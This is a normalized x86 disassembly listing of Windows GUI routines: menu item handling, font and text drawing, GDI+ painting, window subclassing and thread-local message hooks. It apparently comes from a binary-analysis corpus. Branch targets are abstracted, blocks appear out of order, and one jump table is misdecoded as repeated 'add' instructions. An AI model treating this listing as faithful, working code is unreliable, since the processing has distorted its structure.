mov esi [ ebp - 0x20c ]
mov ebx [ ebp - 0x200 ]
mov eax [ ebx + 0x44 ]
mov [ esi + 0x1c ] eax
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_41d760
push ebp
mov ebp esp
push 0xffffffff
push sub_445f4a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x174
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ ebp + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov esi ecx
mov [ ebp - 0x12c ] esi
mov [ ebp - 0x130 ] eax
jne r-xdata
mov eax [ ebp - 0x130 ]
mov [ eax ] 0x0
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
lea esp [ esp ]
mov ecx [ esi + 0x2c ]
lea ebx [ esi + 0x28 ]
mov esi [ ecx + 0x4 ]
cmp [ esi + 0x19 ] 0x0
mov edi esi
jne r-xdata
mov edx [ esi + 0x1c ]
mov edi [ edx + ecx * 4 ]
lea edx [ edx + ecx * 4 ]
cmp ecx eax
jge r-xdata
mov eax [ ebx + 0x4 ]
mov esi [ ebp - 0x12c ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov [ eax ] eax
mov eax [ ebx + 0x4 ]
xor edi edi
mov [ eax + 0x8 ] eax
mov [ ebx + 0x8 ] edi
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
lea esp [ esp ]
lea ebx [ eax - 0x1 ]
cmp ecx ebx
je r-xdata
mov [ rw-data ] edi
push eax
call [ UnhookWindowsHookEx@IAT ]
mov [ esi + 0x8 ] edi
mov edx [ edi + 0x8 ]
push edx
mov ecx ebx
call sub_41eab0
mov edi [ edi ]
push esi
call [ operator delete@IAT ]
add esp 0x4
cmp [ edi + 0x19 ] 0x0
mov esi edi
je r-xdata
dec [ esi + 0x20 ]
xor ebx ebx
cmp edi ebx
je r-xdata
sub eax ecx
add eax eax
add eax eax
lea ecx [ eax - 0x4 ]
push ecx
lea ebx [ edx + 0x4 ]
push ebx
push eax
push edx
call [ memmove_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
mov [ ebp - 0x4 ] ebx
push edi
call [ GetMenuItemCount@IAT ]
test eax eax
jle r-xdata
push 0x80004005
call sub_402d00
movzx eax [ eax + lookup_table_41da94 ]
jmp [ eax * 4 + jump_table_41da84 ]
mov [ ebp - 0x4 ] 0x1
xor eax eax
lea ecx [ ebp - 0x150 ]
push ecx
mov [ ebp - 0x14c ] eax
push edi
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] eax
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] eax
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x150 ] 0x1c
mov [ ebp - 0x14c ] 0x8
call [ GetMenuInfo@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push 0x8007000e
call sub_402d00
push 0x80070057
call sub_402d00
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov edi [ ebp - 0x138 ]
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
mov esi 0x30
push esi
lea ecx [ ebp - 0x180 ]
push 0x0
push ecx
call memset
push 0x110
lea edx [ ebp - 0x124 ]
push 0x0
push edx
mov [ ebp - 0x180 ] esi
call memset
add esp 0x18
lea eax [ ebp - 0x128 ]
push eax
mov [ ebp - 0x128 ] 0x114
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
lea ecx [ eax - 0x1 ]
test ecx ecx
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ ebp - 0x180 ] 0x2c
mov eax [ ebp - 0x124 ]
cmp eax 0x5
jae r-xdata
push edi
call [ operator delete@IAT ]
add esp 0x4
mov edx [ esi ]
push eax
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
push edi
inc ebx
call [ GetMenuItemCount@IAT ]
cmp ebx eax
jl r-xdata
mov [ ebp - 0x17c ] esi
mov edx [ eax + 0xc ]
lea esi [ eax + 0x8 ]
mov [ ebp - 0x178 ] edx
mov eax [ esi ]
mov [ ebp - 0x15c ] eax
mov ecx [ esi ]
push ecx
call [ lstrlenW@IAT ]
lea edx [ ebp - 0x180 ]
push edx
push 0x1
push ebx
push edi
mov [ ebp - 0x158 ] eax
mov [ ebp - 0x160 ] 0x0
call [ SetMenuItemInfoW@IAT ]
mov esi [ esi ]
push esi
call [ `placement delete closure'@IAT ]
mov eax [ ebp - 0x134 ]
push eax
call [ operator delete@IAT ]
add esp 0x8
lea ecx [ ebp - 0x180 ]
push ecx
push 0x1
push ebx
push edi
mov [ ebp - 0x17c ] esi
call [ GetMenuItemInfoW@IAT ]
mov eax [ ebp - 0x160 ]
mov [ ebp - 0x134 ] eax
test eax eax
je r-xdata
cmp eax 0x4
jne r-xdata
mov esi [ ebp - 0x12c ]
cmp [ ebp - 0x120 ] 0x5a
jae r-xdata
sub_41da98
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_41daf0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_445f03
mov eax [ fs : 0x0 ]
push eax
sub esp 0x39c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x394 ] eax
push ebx
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x3a8 ]
mov [ fs : 0x0 ] eax
push 0x1f4
xor ebx ebx
lea eax [ esp + 0x94 ]
mov edi ecx
push ebx
push eax
mov [ esp + 0x1c ] edi
call memset
add esp 0xc
push ebx
lea ecx [ esp + 0x90 ]
push ecx
push 0x1f8
push 0x29
mov [ esp + 0x9c ] 0x1f4
call [ SystemParametersInfoW@IAT ]
cmp eax ebx
je r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x3b0 ] ebx
push edi
mov [ esp + 0x1c ] edi
call [ GetWindowDC@IAT ]
mov edi eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x3b0 ] 0x1
mov eax [ esi + 0x10 ]
push eax
push edi
call [ SelectObject@IAT ]
push 0x424
lea ecx [ esp + 0x20 ]
push ecx
push 0xffffffff
push r--data
push edi
mov [ esp + 0x20 ] eax
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call [ DrawTextW@IAT ]
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
cmp edx 0x4
jge r-xdata
push 0x58
lea edx [ esp + 0x34 ]
push ebx
push edx
mov [ esp + 0x38 ] ebx
call memset
mov eax [ esi + 0x10 ]
add esp 0xc
cmp eax ebx
je r-xdata
mov [ esi + 0x14 ] ebx
lea eax [ esp + 0x1c ]
push eax
call [ SetRectEmpty@IAT ]
mov [ esi + 0x14 ] 0x6
jmp r-xdata
mov edx [ esp + 0x2c ]
cmp edx [ esp + 0x16c ]
jne r-xdata
lea ecx [ esp + 0x2c ]
push ecx
push 0x5c
push eax
call [ GetObjectW@IAT ]
jbe r-xdata
cmp [ esp + 0x28c ] 0x1
jae r-xdata
mov ecx [ esp + 0xc ]
push ecx
push edi
call [ SelectObject@IAT ]
push 0x110
lea edx [ esp + 0x28c ]
push ebx
push edx
mov [ esp + 0x290 ] 0x114
call memset
add esp 0xc
lea eax [ esp + 0x284 ]
push eax
call [ GetVersionExW@IAT ]
mov eax [ esp + 0x288 ]
cmp eax 0x5
jne r-xdata
push r--data
lea edx [ esp + 0x18c ]
push edx
call [ lstrcpyW@IAT ]
lea eax [ esp + 0x16c ]
push eax
call [ CreateFontIndirectW@IAT ]
mov [ esp + 0xc ] eax
cmp eax ebx
je r-xdata
mov eax [ esp + 0x30 ]
cmp eax [ esp + 0x170 ]
jne r-xdata
mov [ esp + 0x3b0 ] 0x2
mov edx [ esp + 0x10 ]
push edi
push edx
mov [ esp + 0x1c ] ebx
call [ ReleaseDC@IAT ]
mov [ esp + 0x3b0 ] 0xffffffff
mov ecx [ esp + 0x3a8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ esp + 0x394 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn
push ebx
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push 0x1022
mov [ esp + 0x1c ] ebx
call [ SystemParametersInfoW@IAT ]
cmp eax ebx
je r-xdata
jmp r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
mov ecx [ esp + 0x34 ]
cmp ecx [ esp + 0x174 ]
jne r-xdata
xor eax eax
cmp [ esp + 0xc ] ebx
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call [ DeleteObject@IAT ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x38 ]
cmp edx [ esp + 0x178 ]
jne r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ esp + 0xc ]
push 0x1
push edx
push 0x30
push edi
mov [ esi + 0x10 ] edx
call [ SendMessageW@IAT ]
cmp eax [ esp + 0xc ]
je r-xdata
mov [ esi + 0x10 ] ebx
mov eax [ esp + 0x3c ]
cmp eax [ esp + 0x17c ]
jne r-xdata
mov [ esi + 0x18 ] al
push eax
call [ DeleteObject@IAT ]
mov cl [ esp + 0x40 ]
cmp cl [ esp + 0x180 ]
jne r-xdata
mov dl [ esp + 0x41 ]
cmp dl [ esp + 0x181 ]
jne r-xdata
mov al [ esp + 0x42 ]
cmp al [ esp + 0x182 ]
jne r-xdata
mov cl [ esp + 0x43 ]
cmp cl [ esp + 0x183 ]
jne r-xdata
mov dl [ esp + 0x44 ]
cmp dl [ esp + 0x184 ]
jne r-xdata
mov al [ esp + 0x45 ]
cmp al [ esp + 0x185 ]
jne r-xdata
mov cl [ esp + 0x46 ]
cmp cl [ esp + 0x186 ]
jne r-xdata
mov dl [ esp + 0x47 ]
cmp dl [ esp + 0x187 ]
jne r-xdata
lea eax [ esp + 0x188 ]
push eax
lea ecx [ esp + 0x4c ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
sub_41de30
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
cmp eax 0x2
je r-xdata
pop esi
pop ebp
retn 0x10
mov edx [ esi ]
test eax eax
sete al
mov [ esi + 0x38 ] al
push eax
mov eax [ edx + 0x4 ]
call eax
test eax eax
je r-xdata
cmp [ eax + 0xc0 ] 0x0
mov dl [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
setne cl
mov [ esi + 0x39 ] cl
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xd ] dl
mov [ esi + 0x3c ] eax
call sub_41daf0
movzx eax [ esi + 0x38 ]
mov edx [ esi ]
mov edx [ edx + 0x4 ]
push eax
mov ecx esi
call edx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_41e790
push 0x4
call [ SetWindowsHookExW@IAT ]
mov [ esi + 0x4 ] eax
sub_41deb0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
test eax eax
je r-xdata
mov ecx [ esi + 0x40 ]
cmp [ ecx - 0xc ] 0x0
mov edi [ ecx - 0x10 ]
lea eax [ ecx - 0x10 ]
je r-xdata
push eax
call [ UnhookWindowsHookEx@IAT ]
mov [ rw-data ] 0x0
mov [ esi + 0x4 ] 0x0
pop edi
pop esi
retn
cmp [ eax + 0xc ] 0x0
lea edx [ eax + 0xc ]
jge r-xdata
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
cmp [ ecx - 0x8 ] 0x0
jge r-xdata
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
add eax 0x10
mov [ esi + 0x40 ] eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ecx - 0xc ] 0x0
mov eax [ esi + 0x40 ]
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
retn
push 0x80070057
call sub_402d00
sub_41df40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_447d2f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] edi
cmp eax 0x46
ja r-xdata
cmp eax 0x47
je r-xdata
je r-xdata
push 0xffffffeb
push esi
call [ GetWindowLongW@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp eax 0x317
jne r-xdata
xor ebx ebx
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov ecx eax
dec ecx
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx eax
call sub_41d140
cmp eax ebx
je r-xdata
mov edx [ esp + 0x18 ]
push edi
push edx
push eax
mov eax [ rw-data ]
push esi
push eax
call [ CallWindowProcW@IAT ]
xor ebx ebx
mov [ esp + 0x60 ] ebx
lea ecx [ esp + 0x40 ]
push ecx
push esi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x40 ]
push edx
lea eax [ esp + 0x20 ]
push eax
mov edi edx
call sub_41b390
mov [ esp + 0x60 ] 0x1
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
mov eax [ rw-data ]
push ecx
push edx
push 0x318
push esi
push eax
call [ CallWindowProcW@IAT ]
lea esi [ esp + 0x1c ]
mov edi eax
call sub_41b440
mov [ esp + 0x60 ] bl
mov ecx esi
push ecx
call sub_41b480
mov [ esp + 0x60 ] 0xffffffff
mov eax edi
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ rw-data ]
push edi
push edx
push 0x46
push esi
push eax
call [ CallWindowProcW@IAT ]
xor eax eax
jmp r-xdata
cmp [ edi + 0xc ] ebx
jne r-xdata
push edi
push edx
mov edx [ rw-data ]
push 0x1
push esi
push edx
call [ CallWindowProcW@IAT ]
mov ebx [ GetWindowLongW@IAT ]
push 0xfffffff0
push esi
mov edi eax
call ebx
and eax 0xff7fffff
or eax 0x6000000
push eax
push 0xfffffff0
push esi
call [ SetWindowLongW@IAT ]
push 0xffffffec
push esi
call ebx
and eax 0xfffffefe
push eax
push 0xffffffec
push esi
call [ SetWindowLongW@IAT ]
push r--data
push esi
call [ SetWindowTextA@IAT ]
mov eax edi
jmp r-xdata
sub ecx 0x13
jne r-xdata
mov eax [ eax + 0xc ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
cmp [ edi + 0x10 ] ebx
jne r-xdata
push 0xffffffeb
push esi
call [ GetWindowLongW@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
push eax
mov ecx esi
call sub_41e3f0
cmp [ edi + 0x14 ] ebx
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx eax
call sub_41d140
mov edi eax
cmp edi ebx
je r-xdata
mov eax esi
call sub_41d1d0
mov [ esp + 0x14 ] eax
cmp eax ebx
je r-xdata
mov eax [ edi + 0xc ]
mov [ esp + 0x14 ] eax
cmp eax ebx
je r-xdata
mov eax [ eax + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ esp + 0x40 ]
push eax
push esi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x40 ]
neg ecx
push ecx
neg edx
push edx
lea eax [ esp + 0x48 ]
push eax
call [ OffsetRect@IAT ]
mov ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x48 ]
call sub_41e1e0
push eax
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
push 0x210
push ebx
push ebx
push ebx
push ebx
push ebx
push ecx
call [ SetWindowPos@IAT ]
sub_41e1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_447cf7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
mov esi ecx
push ebx
lea ecx [ ebp - 0x44 ]
push ecx
mov edi ebx
mov ecx esi
mov [ ebp - 0x58 ] eax
call sub_41b390
xor edi edi
mov [ ebp - 0x4 ] edi
push 0x11
call [ GetStockObject@IAT ]
mov edx [ ebp - 0x44 ]
push eax
push edx
call [ SelectObject@IAT ]
mov eax [ ebp - 0x44 ]
push 0x1
push eax
call [ SetBkMode@IAT ]
lea ecx [ ebp - 0x48 ]
push ecx
push esi
mov [ ebp - 0x48 ] edi
call [ GdipCreateFromHDC@IAT ]
mov edx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x54 ]
push 0x5
push eax
call [ GdipSetInterpolationMode@IAT ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x54 ]
push 0x4
push ecx
call [ GdipSetPixelOffsetMode@IAT ]
cmp eax edi
je r-xdata
mov [ ebp - 0x50 ] eax
mov edi [ ebp - 0x58 ]
mov ecx edi
call sub_41c150
push 0xffffffff
push 0xffffffff
push ebx
call [ InflateRect@IAT ]
mov esi [ ebp + 0xc ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x4 ] 0x2
push 0x0
call [ CreateCompatibleDC@IAT ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x6c ] r--data
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x64 ] edx
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x4 ] 0x3
lea edx [ ebp - 0x6c ]
push edx
mov ecx ebx
mov edx edi
call sub_41c220
mov eax [ ebx + 0xc ]
mov cl [ esi + 0x4 ]
mov esi [ ebx + 0x4 ]
mov ebx [ ebx ]
mov [ ebp - 0x48 ] eax
mov al [ edi + 0x39 ]
test al al
jne r-xdata
dec [ ebx + 0x4 ]
xor edx edx
test cl cl
sete dl
dec [ ebp - 0x48 ]
add esi edx
inc ebx
lea ecx [ ebx + 0x18 ]
lea ecx [ ebx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ DeleteDC@IAT ]
xor edi edi
cmp eax edi
je r-xdata
mov edx [ ebp - 0x64 ]
mov ebx [ edx ]
mov [ ebp - 0x4 ] 0x4
movzx ecx [ edi + 0x38 ]
mov eax [ edi ]
mov edx [ eax + 0x4 ]
push ecx
mov ecx edi
call edx
mov eax [ eax + 0xdc ]
mov edi [ SetBkColor@IAT ]
push eax
push ebx
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x14 ] ecx
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x6c ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x4c ]
cmp eax edi
je r-xdata
push eax
call esi
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x3
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x2
push 0x0
push 0x0
push ebx
call [ ExtTextOutW@IAT ]
push esi
push ebx
call edi
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x54 ]
push ecx
call [ GdipDeleteGraphics@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ ebp - 0x44 ]
push edx
call sub_41b480
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
push eax
mov [ ebp - 0x4c ] edi
call esi
mov [ ebp - 0x4c ] edi
sub_41e3f0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi ecx
push 0xffffffeb
push esi
mov [ ebp - 0x2c ] eax
call [ GetWindowLongW@IAT ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx eax
call sub_41d140
mov edi eax
cmp edi ebx
je r-xdata
cmp [ edi + 0x4 ] bl
je r-xdata
mov eax [ edi + 0x8 ]
cmp eax ebx
jne r-xdata
push eax
call [ IsWindowVisible@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
call [ GetWindowRect@IAT ]
lea edx [ ebp - 0x28 ]
mov ecx esi
mov esi [ ebp - 0x2c ]
push edx
call sub_41e580
mov [ edi + 0x8 ] eax
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi + 0x8 ]
lea eax [ ebp - 0x28 ]
push eax
push ecx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call [ GetWindowRect@IAT ]
lea edx [ ebp - 0x18 ]
push edx
push esi
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x24 ]
jne r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
push 0x254
push 0x4f
sub edx ecx
push edx
add eax 0xffffffb1
push eax
mov eax [ edi + 0x8 ]
push ecx
push ebx
push eax
call [ SetWindowPos@IAT ]
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov edx 0x1
mov ecx esi
lea ebx [ ebp - 0x3c ]
call sub_414520
mov eax [ ebp - 0xc ]
lea ecx [ eax + 0x4f ]
cmp ecx [ ebp - 0x30 ]
jle r-xdata
add [ ebp - 0x14 ] 0x4f
mov edx [ ebp - 0x24 ]
sub edx eax
add [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
push 0x254
push 0x4f
sub ecx eax
push ecx
add edx 0xffffffb1
push edx
push eax
mov eax [ edi + 0x8 ]
mov edi [ SetWindowPos@IAT ]
push 0x0
push eax
call edi
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
push 0x11
push 0x0
push 0x0
push ecx
push edx
push 0xffffffff
push esi
call edi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
sub_41e580
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
push edi
mov edi ecx
mov ecx [ eax ]
mov [ ebp - 0x18 ] ecx
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0xc ]
mov eax [ eax + 0x4 ]
add eax 0x4f
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
call sub_41b540
mov ecx [ rw-data ]
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
push 0x0
push ecx
mov ecx [ ebp - 0x18 ]
push 0x0
push edi
sub edx eax
push edx
mov edx [ ebp - 0x10 ]
sub edx ecx
push edx
push eax
push ecx
push 0x82000000
push r--data
push r--data
push 0x84
call [ CreateWindowExW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
xor ecx ebp
pop edi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
movzx ecx [ esi + 0x38 ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push ecx
mov ecx esi
call edx
mov eax [ eax + 0xd8 ]
push eax
push r--data
push edi
call [ SetPropA@IAT ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
neg eax
push eax
neg ecx
push ecx
lea edx [ ebp - 0x18 ]
push edx
call [ OffsetRect@IAT ]
mov eax 0x1
add [ ebp - 0x18 ] eax
sub [ ebp - 0x10 ] eax
add [ ebp - 0x14 ] eax
mov eax [ esi ]
mov edx [ eax + 0x10 ]
lea ecx [ ebp - 0x18 ]
push ecx
push edi
mov ecx esi
call edx
mov eax edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_41e680
push 0xffffffff
call [ SetWindowsHookExW@IAT ]
mov [ esi + 0x8 ] eax
sub_41e680
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp ebx 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
push ecx
push ebx
push 0xffffffff
call [ CallNextHookEx@IAT ]
test edi edi
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x200
jb r-xdata
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
cmp eax 0x100
je r-xdata
cmp eax 0x20e
ja r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
cmp eax 0x101
je r-xdata
lea eax [ esp + 0xc ]
push eax
call [ GetCursorPos@IAT ]
mov edx [ rw-data ]
xor eax eax
lea ecx [ esp + 0x14 ]
push ecx
push edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
lea edx [ esp + 0x1c ]
push edx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
cmp eax 0x102
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
push eax
mov eax [ rw-data ]
push ecx
push edx
push eax
call [ SendMessageW@IAT ]
cmp [ esi + 0x4 ] 0x200
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
jmp r-xdata
lea edi [ ebx - 0x1 ]
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ SendMessageW@IAT ]
sub_41e790
push ebp
mov ebp esp
sub esp 0x104
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ ebx + 0x8 ]
push esi
mov esi [ ebx + 0xc ]
